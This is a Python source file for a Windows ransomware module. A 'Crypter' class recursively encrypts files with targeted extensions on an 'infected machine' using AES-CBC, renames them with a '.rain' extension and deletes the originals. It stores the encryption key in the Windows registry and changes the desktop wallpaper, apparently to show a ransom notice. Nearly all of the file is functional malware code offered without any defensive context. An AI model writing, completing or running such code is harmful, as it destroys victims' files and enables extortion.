from Crypto.Cipher import AES
from Crypto.Random import new
from glob import iglob
from os.path import splitext, getsize
from os import remove, getenv
from struct import pack
from shutil import copyfile
from ctypes import windll
from winreg import *
from bitstring import BitArray
from util import exts


class Crypter:
    """
    Contain the necessary methods to encrypt the infected machine's files and other
    "useful" functions (registry_key, change_background, __save_randomkey).
    """
    def __init__(self) -> None:
        self.__key = new().read(32)  # Generates a 32-byte random key
        self.__save_randomkey()

    def __crypt_file(self, file: str, chunksize=64 * 2048) -> None:
        """
        Encrypts a file using AES CBC encryption mode and the "pack" function.
        The encrypted content is saved in a file of the same name with the extension "rain",
        which also contains its original version in the first characters (see line 54).
        Deletes the original file from the system.

        NOTE: Should only be used by the "crypt_directory" method.

        Parameters
        ----------
        file : str
            Path to the file to be encrypted
        chunksize: int
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.

        Return
        ----------
        None
        """
        out_file = splitext(file)[0] + '.rain'
        ext = (splitext(file)[1].strip('.') + '.').encode()
        fsz = getsize(file)
        iv = new().read(AES.block_size)

        encryptor = AES.new(self.__key, AES.MODE_CBC, iv)

        with open(out_file, 'wb') as encrypted:
            encrypted.write(ext)
            encrypted.write(pack('<Q', fsz))
            encrypted.write(iv)

            with open(file, 'rb') as original:

                while True:
                    data = original.read(chunksize)
                    n = len(data)

                    if n == 0:
                        break
                    elif n % 16 != 0:
                        data += b' ' * (16 - n % 16)

                    dataenc = encryptor.encrypt(data)
                    encrypted.write(dataenc)

        remove(file)

    def crypt_directory(self, directory: str) -> None:
        """
        Encrypts all files in a directory (including their sub-directories) if they have
        any extensions present in the "exts" list using the "iglob" generator. If, when
        calling the "__crypt_file" method, an exception of type "PermissionError" is thrown,
        the code moves on to the next file.

        Parameters
        ----------
        directory: str
            Path to the directory to be encrypted

        Return
        ----------
        None
        """
        for extension in exts:
            files = iglob(directory + '/**/*' + extension, recursive=True)

            for file in files:
                try:
                    self.__crypt_file(file)
                except PermissionError:
                    continue

    def __save_randomkey(self) -> None:
        """
        Register the generated key in the Windows registry using the "registry_key" method.

        NOTE: Should only be used in the initializer method (__init__).

        Return
        ----------
        None
        """
        binkey = BitArray(hex=self.__key.hex()).bin

        self.registry_key('', binkey, ' ')

    @staticmethod
    def registry_key(keypath: str, value: str, name: str) -> None:
        """
        Registers a "REG_SZ" key in the Windows registry. If an exception is thrown when
        registering the key in "HKEY_LOCAL_MACHINE", the code will register it in
        "HKEY_CURRENT_USER".

        Parameters
        ----------
        keypath: str
            Path where the key will be registered
        value: str
            Value of key
        name: str
            Name of key

        Return
        ----------
        None
        """
        key = CreateKey(HKEY_LOCAL_MACHINE, keypath)

        try:
            SetValueEx(key, name, 0, REG_SZ, value)
            CloseKey(key)
        except PermissionError:
            key = CreateKey(HKEY_CURRENT_USER, keypath)
            SetValueEx(key, name, 0, REG_SZ, value)
            CloseKey(key)

    @staticmethod
    def change_background(background: str, appdata=getenv('APPDATA')) -> None:
        """
        Change the background of the machine's desktop using the "SystemParametersInfoW"
        function from "windll". This function is uncertain and may not work properly, making
        the background just empty (black). Saves the previous background in the themes directory.

        Parameters
        ----------
        background: str
            Path to the background to be placed (must be an image)
        appdata: str
            Path to the "appdata" folder, obtained by the "getenv" function.
            It should not be changed.

        Return
        ----------
        None
        """
        src = appdata + '/Microsoft/Windows/Themes/TranscodedWallpaper'
        dst = appdata + '/Microsoft/Windows/Themes/OldTranscodedWallpaper'

        try:
            copyfile(src, dst)
        except FileNotFoundError:
            return

        windll.user32.SystemParametersInfoW(20, 0, background, 0)
